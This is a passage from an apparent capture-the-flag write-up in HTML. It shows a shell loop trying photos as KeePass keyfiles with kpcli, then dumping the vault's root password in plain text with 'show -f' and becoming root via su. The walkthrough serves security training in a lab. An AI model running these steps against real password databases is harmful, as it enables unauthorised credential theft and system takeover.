</pre></td> --><td class="rouge-code"><pre><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">ls </span>IMG<span class="k">*</span>JPG<span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"Trying </span><span class="nv">$i</span><span class="s2"> as keyfile"</span><span class="p">;</span>kpcli <span class="nt">--kdb</span> MyPasswords.kdbx <span class="nt">--key</span> <span class="nv">$i</span>  <span class="p">;</span> <span class="k">done
</span>Trying IMG_0545.JPG as keyfile
Please provide the master password: <span class="k">*************************</span>
Couldn<span class="s1">'t load the file MyPasswords.kdbx: The database key appears invalid or else the database is corrupt.
Trying IMG_0546.JPG as keyfile
Please provide the master password: *************************
Couldn'</span>t load the file MyPasswords.kdbx: The database key appears invalid or <span class="k">else </span>the database is corrupt.
Trying IMG_0547.JPG as keyfile
Please provide the master password: <span class="k">*************************</span>

KeePass CLI <span class="o">(</span>kpcli<span class="o">)</span> v3.1 is ready <span class="k">for </span>operation.
Type <span class="s1">'help'</span> <span class="k">for </span>a description of available commands.
Type <span class="s1">'help &lt;command&gt;'</span> <span class="k">for </span>details on individual commands.

kpcli:/&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Listing Contents in keepass database:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td> --><td class="rouge-code"><pre>kpcli:/&gt; <span class="nb">ls</span>
<span class="o">===</span> Groups <span class="o">===</span>
MyPasswords/
kpcli:/MyPasswords&gt; <span class="nb">ls</span>
<span class="o">===</span> Groups <span class="o">===</span>
eMail/
General/
Homebanking/
Internet/
Network/
Recycle Bin/
Windows/
<span class="o">===</span> Entries <span class="o">===</span>
0. Root password
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Thereâ€™s a show option in <code class="language-plaintext highlighter-rouge">kpcli</code>: <code class="language-plaintext highlighter-rouge">show -- Show an entry: show [-f] [-a] &lt;entry path|entry number&gt;</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td> --><td class="rouge-code"><pre>kpcli:/MyPasswords&gt; show 0

Title: Root password
Uname: root
 Pass: <span class="k">****************************</span>
  URL:
Notes:
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I can use the <code class="language-plaintext highlighter-rouge">-f</code> flag, maybe it shows the password:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td> --><td class="rouge-code"><pre>kpcli:/MyPasswords&gt; show <span class="nt">-f</span> 0

Title: Root password
Uname: root
 Pass: u3v2249dl9ptv465cogl3cnpo3fyhk
  URL:
Notes:
</pre></td></tr></tbody></table></code></pre></div></div>

<p>And we can get root:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td> --><td class="rouge-code"><pre>user@safe:~<span class="nv">$ </span>su root
Password:
root@safe:/home/user# <span class="nb">whoami
</span>root
</pre></td></tr></tbody></table></code></pre></div></div>
:ET